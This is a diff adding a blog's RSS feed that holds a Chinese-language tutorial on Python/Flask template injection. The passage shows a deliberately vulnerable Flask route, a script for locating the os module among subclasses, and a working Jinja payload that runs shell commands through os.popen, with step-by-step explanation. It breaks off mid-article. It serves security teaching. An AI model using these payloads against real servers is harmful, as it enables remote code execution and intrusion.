@@ -1,0 +1,966 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>漏洞学习记录 on hadagaga blog</title><link>https://hadagaga.github.io/categories/cate1/</link><description>Recent content in 漏洞学习记录 on hadagaga blog</description><generator>Hugo -- gohugo.io</generator><language>en-zh</language><lastBuildDate>Wed, 18 Dec 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://hadagaga.github.io/categories/cate1/index.xml" rel="self" type="application/rss+xml"/><item><title>python模板注入漏洞深度解析，从成因到简单利用，从简单利用到绕过，从回显到盲注</title><link>https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/</link><pubDate>Wed, 18 Dec 2024 00:00:00 +0000</pubDate><guid>https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/</guid><description>&lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/cover.png" alt="Featured image of post python模板注入漏洞深度解析，从成因到简单利用，从简单利用到绕过，从回显到盲注" />&lt;h2 id="模板注入漏洞成因">模板注入漏洞成因
+&lt;/h2>&lt;p>​ 模板注入漏洞的造成是由于在程序设计时，没有将用户传入的参数进行适当的处理再插入模板中，而是直接将用户的参数嵌入到模板中，从而导致漏洞。&lt;/p>
+&lt;p>​ 以下是一个简单的模板注入漏洞的示例：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/ssti-nowaf&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">ssti_nowaf&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;payload&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 从这个示例中我们可以看到，这里直接将用户输入的字符串插入到模板字符串中，导致了模板注入漏洞。比如我们传入参数。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="err">payload={{&amp;#39;a&amp;#39;*7}}
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 页面将会返回&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="err">aaaaaaa
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ &lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218104815804.png"
+width="608"
+height="92"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218104815804_hu15850944948125888931.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218104815804_hu10448747268324247099.png 1024w"
+loading="lazy"
+alt="image-20241218104815804"
+class="gallery-image"
+data-flex-grow="660"
+data-flex-basis="1586px"
+>&lt;/p>
+&lt;p>​ 可见，python中的模板注入漏洞会导致用户可以执行任意的python代码。&lt;/p>
+&lt;h2 id="模板注入漏洞利用">模板注入漏洞利用
+&lt;/h2>&lt;p>​ 我们已知，当存在模板注入漏洞时我们可以执行任意的python代码，那么我们的下一步就是利用python代码执行命令，而在python代码中，如果要执行命令，我们的首先想到的就是寻找os模块，利用其中的popen方法进行命令执行。那么根据python的特性，我们要获取os中的popen模块，通常可以采用如下方法：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">num&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">item&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__base__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__subclasses__&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span> &lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="s1">&amp;#39;os&amp;#39;&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">item&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="fm">__init__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__globals__&lt;/span> &lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">num&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">num&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span> &lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">num&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">continue&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 使用该python代码，即可在本地寻找os模块，我们稍作修改，即可在模板注入漏洞中利用它来尝试寻找靶机中的os模块。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="n">item&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__base__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__subclasses__&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="s1">&amp;#39;os&amp;#39;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="ow">in&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="n">item&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="fm">__init__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__globals__&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">item&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="fm">__init__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__globals__&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="n">endif&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 放入BP中爆破：&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218115144061.png"
+width="1856"
+height="768"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218115144061_hu172701944984534053.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218115144061_hu16812711121264324604.png 1024w"
+loading="lazy"
+alt="image-20241218115144061"
+class="gallery-image"
+data-flex-grow="241"
+data-flex-basis="580px"
+>&lt;/p>
+&lt;p>​ 可以看到还是有很多地方有os模块的，我们选择第一个306，构造payload：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__base__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__subclasses__&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">306&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="fm">__init__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__globals__&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;os&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;popen&amp;#39;&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="s1">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()}}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 以上就是一个简单的pythonssti的利用过程，我们接下来对针对这个payload进行解释。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 这一步是在利用字符串类的魔术方法，去获取他的类对象。这里还可以使用除字符串以外的其他类型比如元组，数组。&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218115604550.png"
+width="1097"
+height="229"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218115604550_hu14383805307316651841.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218115604550_hu4323096061319709987.png 1024w"
+loading="lazy"
+alt="image-20241218115604550"
+class="gallery-image"
+data-flex-grow="479"
+data-flex-basis="1149px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__base__&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 这一步是获取基类，这一步是很多payload的重要步骤，因为我们如果想要调用os方法就需要通过基类去获取。&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218115921452.png"
+width="946"
+height="298"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218115921452_hu6688119579974398608.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218115921452_hu11355352464736555755.png 1024w"
+loading="lazy"
+alt="image-20241218115921452"
+class="gallery-image"
+data-flex-grow="317"
+data-flex-basis="761px"
+>&lt;/p>
+&lt;p>​ 接下来就是获取他的所有子类。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__base__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__subclasses__&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ &lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218120047507.png"
+width="1531"
+height="556"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218120047507_hu12098663641526618378.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218120047507_hu6465764599815962950.png 1024w"
+loading="lazy"
+alt="image-20241218120047507"
+class="gallery-image"
+data-flex-grow="275"
+data-flex-basis="660px"
+>&lt;/p>
+&lt;p>​ 再使用前面所提供的查找os模块的代码，找到os模块的下标后初始化，获取全局变量，使用os中的popen方法进行命令执行。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__base__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__subclasses__&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">306&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="fm">__init__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__globals__&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;os&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;popen&amp;#39;&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="s1">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218120320979.png"
+width="1392"
+height="520"
